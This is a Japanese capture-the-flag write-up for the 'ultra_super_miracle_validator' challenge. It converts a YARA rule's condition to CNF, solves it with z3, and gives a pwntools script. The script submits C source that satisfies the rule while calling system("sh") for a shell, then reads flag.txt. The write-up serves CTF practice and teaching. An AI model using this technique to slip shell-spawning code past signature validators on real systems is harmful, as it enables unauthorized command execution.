# writeup - ultra_super_miracle_validator

SAT

rule.yaraの条件は
`(x1 v x6 v x12 v -x21 v x32) ^ (x3 v x5 v -x11 v x24 v x35) ^ (-x3 v x31 v x40 v x9 v x27) ^ (x4 v x8 v x10 v x29 v x40) ^ (x4 v x7 v x11 v x25 v -x36) ^ (x8 v x14 v x18 v x21 v x38) ^ (x12 v x15 v -x20 v x30 v x35) ^ (x19 v x21 v -x32 v x33 v x39) ^ (x2 v x37 v x19 v -x23) ^ (-x5 v x14 v x23 v x30) ^ (-x5 v x8 v x18 v x23) ^ (x33 v x22 v x4 v x38) ^ (x2 v x20 v x39) ^ (x3 v x15 v -x30) ^ (x6 v -x17 v x30) ^ (x8 v x29 v -x21) ^ (-x16 v x1 v x29) ^ (x20 v x10 v -x5) ^ (x21 v x28 v x30) ^ (-x13 v x25) ^ -x2 ^ x3 ^ -x7 ^ -x10 ^ -x11 ^ x14 ^ -x15 ^ -x22 ^ x26 ^ -x27 ^ x34 ^ x36 ^ x37 ^ -x40`
なので，cnfにしてSAT Solverに食わせると良い．

rule.cnf
```
c (x1 v x6 v x12 v -x21 v x32) ^ (x3 v x5 v -x11 v x24 v x35) ^ (-x3 v x31 v x40 v x9 v x27) ^ (x4 v x8 v x10 v x29 v x40) ^ (x4 v x7 v x11 v x25 v -x36) ^ (x8 v x14 v x18 v x21 v x38) ^ (x12 v x15 v -x20 v x30 v x35) ^ (x19 v x21 v -x32 v x33 v x39) ^ (x2 v x37 v x19 v -x23) ^ (-x5 v x14 v x23 v x30) ^ (-x5 v x8 v x18 v x23) ^ (x33 v x22 v x4 v x38) ^ (x2 v x20 v x39) ^ (x3 v x15 v -x30) ^ (x6 v -x17 v x30) ^ (x8 v x29 v -x21) ^ (-x16 v x1 v x29) ^ (x20 v x10 v -x5) ^ (x21 v x28 v x30) ^ (-x13 v x25) ^ -x2 ^ x3 ^ -x7 ^ -x10 ^ -x11 ^ x14 ^ -x15 ^ -x22 ^ x26 ^ -x27 ^ x34 ^ x36 ^ x37 ^ -x40
p cnf 40 34
1 6 12 -21 32 0
3 5 -11 24 35 0
-3 31 40 9 27 0
4 8 10 29 40 0
4 7 11 25 -36 0
8 14 18 21 38 0
12 15 -20 30 35 0
19 21 -32 33 39 0
2 37 19 -23 0
-5 14 23 30 0
-5 8 18 23 0
33 22 4 38 0
2 20 39 0
3 15 -30 0
6 -17 30 0
8 29 -21 0
-16 1 29 0
20 10 -5 0
21 28 30 0
-13 25 0
-2 0
3 0
-7 0
-10 0
-11 0
14 0
-15 0
-22 0
26 0
-27 0
34 0
36 0
37 0
-40 0
```

```sh
$ z3 rule.cnf
sat
-1 -2 3 4 -5 -6 -7 8 9 -10 -11 12 -13 14 -15 -16 -17 -18 -19 20 21 -22 -23 -24 -25 26 -27 -28 -29 -30 -31 -32 -33 34 -35 36 37 -38 -39 -40
```

## solver

```python
#!/usr/bin/env python3
from pwn import *
import os

HOST = os.getenv('CTF4B_HOST', '0.0.0.0')
PORT = int(os.getenv('CTF4B_PORT', '5000'))

context.log_level = 'critical'
io = remote(HOST, PORT)

payload = 'int main(){puts("'
payload += '廃墟の街'
payload += 'イチジクのタルト'
payload += '天使'
payload += '紫陽花'
payload += '\\x83\\x4a\\x83\\x75\\x83\\x67\\x92\\x8e'
payload += '\\x83\\x43\\x83\\x60\\x83\\x57\\x83\\x4e\\x82\\xcc\\x83\\x5e\\x83\\x8b\\x83\\x67'
payload += '\\x94\\xe9\\x96\\xa7\\x82\\xcc\\x8d\\x63\\x92\\xe9'
payload += '\\x30\\x89\\x30\\x5b\\x30\\x93\\x96\\x8e\\x6b\\xb5'
payload += '\\x2b\\x4d\\x4b\\x51\\x2d\\x2b\\x4d\\x4d\\x45\\x2d\\x2b\\x4d\\x4c\\x67\\x2d\\x2b\\x4d\\x4b\\x38\\x2d\\x2b\\x4d\\x47\\x34\\x2d\\x2b\\x4d\\x4c\\x38\\x2d\\x2b\\x4d'
payload += '\\x72\\x79\\x75\\x70\\x70\\xb9'
payload += '\\x2b\\x63\\x6e\\x6b\\x2d\\x2b\\x64\\x58\\x41\\x2d\\x2b\\x63'
payload += '\\x2b\\x4d\\x4c\\x67\\x2d\\x2b\\x4d\\x4f\\x63\\x2d\\x2b\\x4d\\x4d\\x4d\\x2d\\x2b'
payload += '");system("sh");}'

io.sendlineafter(b'source:\n', payload.encode())

io.sendline(b'echo exploited')
io.sendlineafter(b'exploited', b'cat flag.txt')
io.readline()
print(io.readline().decode(), end='')
```
